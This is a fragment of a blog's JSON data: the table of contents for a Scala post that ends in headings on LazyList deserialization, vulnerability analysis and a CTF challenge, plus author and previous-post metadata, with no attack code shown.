class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8C%B9%E9%85%8D%E5%99%A8match\"><span class=\"toc-text\">匹配器match</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">基本用法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">其他用法</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#apply%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">apply方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#apply%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89%E5%9C%A8%E4%BC%B4%E7%94%9F%E5%AF%B9%E8%B1%A1%E4%B8%AD\"><span class=\"toc-text\">apply方法定义在伴生对象中</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#apply%E6%96%B9%E6%B3%95%E5%AE%9A%E4%B9%89%E5%9C%A8%E4%BC%B4%E7%94%9F%E7%B1%BB%E4%B8%AD\"><span class=\"toc-text\">apply方法定义在伴生类中</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BC%B4%E7%94%9F%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">伴生对象</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E8%B4%A8trait\"><span class=\"toc-text\">特质trait</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">使用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%A9%E5%B1%95%E5%8D%95%E4%B8%AA%E7%89%B9%E8%B4%A8\"><span class=\"toc-text\">扩展单个特质</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%A9%E5%B1%95%E5%A4%9A%E4%B8%AA%E7%89%B9%E8%B4%A8\"><span class=\"toc-text\">扩展多个特质</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%87%AA%E8%BA%AB%E7%B1%BB%E5%9E%8Bself-type\"><span class=\"toc-text\">自身类型self-type</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8D%95%E4%BE%8B%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">单例对象</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Lazylist\"><span class=\"toc-text\">Lazylist</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#State-head%E5%8F%8Atail\"><span class=\"toc-text\">State,head及tail</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Lazylist%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">Lazylist的序列化和反序列化</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-vs-%E6%AD%A3%E5%B8%B8%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">匿名函数 vs 正常函数</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Scala%E6%80%A7%E8%B4%A8\"><span class=\"toc-text\">Scala性质</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#payload%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">payload构造过程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#maven\"><span class=\"toc-text\">maven</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#idea\"><span class=\"toc-text\">idea</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">格式化代码</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SCTF-an4er-monitor\"><span class=\"toc-text\">SCTF an4er_monitor</span></a></li></ol>","author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"hexo_config","uid":"4c90b088c95eb83a9985c879c9096e11","slug":"hexo-config","date":"2023-08-01T01:58:58.000Z","updated":"2023-08-01T10:25:45.632Z","comments":true,"path":"api/articles/hexo-config.json","keywords":null,"cover":null,"text":"hexo 图片配置头像配置 不知道为什么，hexo无法访问图床图片 在设置头像时，创建source/images/picture.jpg ，在该文件夹下放图片 运行时，可以用localhost:4000/images/picture.jpg访问到 在_config.aurora....","link":"","photos":[],"count_time":{"symbolsCount":183,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"hexo","slug":"hexo","count":1,"path":"api/tags/hexo.json"}],"author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}